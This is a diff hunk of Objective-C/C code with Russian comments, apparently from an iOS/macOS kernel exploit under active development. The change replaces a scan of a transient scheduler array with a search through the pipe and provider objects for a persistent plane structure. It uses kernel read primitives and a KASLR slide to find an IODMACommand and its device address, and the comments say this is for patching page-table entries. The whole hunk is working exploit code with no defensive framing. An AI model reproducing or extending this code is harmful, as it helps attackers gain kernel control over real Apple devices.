@@ -6658,29 +6658,34 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
         // → DVA=[mapObj+0xa0] → pageIdx=DVA>>14 → walk L0/L1/L2/leaf (valid=bit0,
         // child=(e<<4)&0x3ffffffc000) → PTE. Патч ТОЛЬКО при совпадении PA-маски.
         uint64_t cmdVA = 0, dva = 0, dvaLen = 0;
-        if (kpLooksLikeKernelPointer(provVA)) {
-            uint64_t schVA = kpLooksLikeKernelPointer(pipeVA) ? kp_untag_ptr(early_kread64(pipeVA + 0xb8)) : 0;   // 1.9.166 (р.39): scheduler = [pipe+0xb8]
-            uint64_t earr = kpLooksLikeKernelPointer(schVA) ? kp_untag_ptr(early_kread64(schVA + 0xc8)) : 0;
-            uint64_t ecnt = kpLooksLikeKernelPointer(schVA) ? early_kread64(schVA + 0xb8) : 0;
-            kpNote(r, [NSString stringWithFormat:@"  [P2] chain-B: scheduler=%#llx arr=%#llx count=%llu",
-                      (unsigned long long)schVA, (unsigned long long)earr, (unsigned long long)ecnt]);
-            if (kpLooksLikeKernelPointer(earr)) {
-                for (uint64_t i = 0; i < 384 && !cmdVA; i++) {   // 1.9.167: count-поле мусорное — скан по массиву с фильтрами
-                    uint64_t ep = kp_untag_ptr(early_kread64(earr + i * 8));
-                    if (!kpLooksLikeKernelPointer(ep) || !kvtophys(ep)) continue;
-                    if ((uint32_t)(early_kread64(ep + 0xc38) >> 32) != 0x10) continue;
-                    kpNote(r, [NSString stringWithFormat:@"  [P2] chain-B: наша запись %#llx (credit ✓)", (unsigned long long)ep]);
-                    for (uint32_t mo = 0x98; mo <= 0xa0 && !cmdVA; mo += 8) {
-                        uint64_t cand = kp_untag_ptr(early_kread64(ep + mo));
-                        if (!kpLooksLikeKernelPointer(cand) || !kvtophys(cand)) continue;
-                        uint64_t cvt = kp_untag_ptr(early_kread64(cand));
-                        uint64_t cFile = cvt ? cvt - kslide2 : 0;
-                        kpNote(r, [NSString stringWithFormat:@"    +%#x → cmd=%#llx vt(file)=%#llx%@",
-                                  mo, (unsigned long long)cand, (unsigned long long)cFile,
-                                  (uint32_t)cFile == 0x7afa9e8 ? @" = IODMACommand ✓" : @""]);
-                        if ((uint32_t)cFile == 0x7afa9e8) cmdVA = cand;   // 1.9.167: low32-сравнение (cFile = prelink VA)
-                    }
-                }
+        // 1.9.168: op-entry ТРАНЗИТЕН (к фазе 2 наш оп исполнился и запись
+        // рециклирована — chain-B пуст). cmd живёт в ПЕРСИСТЕНТНОМ plane-struct
+        // (р.33/37: [plane-struct+0x90]=surface, [+0x98]=IODMACommand) — хант по
+        // указателям pipe/provider: [P+0x90]==surfVA. Затем cmd→mapObj+0xa0=DVA.
+        uint64_t planeStruct = 0;
+        for (uint32_t src = 0; src < 2 && !planeStruct; src++) {
+            uint64_t host = src ? provVA : pipeVA;
+            if (!kpLooksLikeKernelPointer(host) || !surfVA) continue;
+            uint32_t lim4 = src ? 0x200 : 0x400;
+            for (uint32_t o = 0; o + 8 <= lim4 && !planeStruct; o += 8) {
+                uint64_t P = kp_untag_ptr(early_kread64(host + o));
+                if (!kpLooksLikeKernelPointer(P) || !kvtophys(P)) continue;
+                if ((uint32_t)(P & 0x3fff) + 0xa0 > 0x4000) continue;
+                if (kp_untag_ptr(early_kread64(P + 0x90)) != surfVA) continue;
+                planeStruct = P;
+                kpNote(r, [NSString stringWithFormat:@"  [P2] plane-struct @ %s+%#x = %#llx ([+0x90]=surfVA ✓)",
+                          src ? "prov" : "pipe", o, (unsigned long long)P]);
+            }
+        }
+        if (planeStruct) {
+            uint64_t cand = kp_untag_ptr(early_kread64(planeStruct + 0x98));
+            if (kpLooksLikeKernelPointer(cand) && kvtophys(cand)) {
+                uint64_t cvt = kp_untag_ptr(early_kread64(cand));
+                uint64_t cFile = cvt ? cvt - kslide2 : 0;
+                kpNote(r, [NSString stringWithFormat:@"  [P2] cmd=[plane+0x98]=%#llx vt(file)=%#llx%@",
+                          (unsigned long long)cand, (unsigned long long)cFile,
+                          (uint32_t)cFile == 0x7afa9e8 ? @" = IODMACommand ✓" : @""]);
+                if ((uint32_t)cFile == 0x7afa9e8) cmdVA = cand;
             }
         }
         if (cmdVA) {
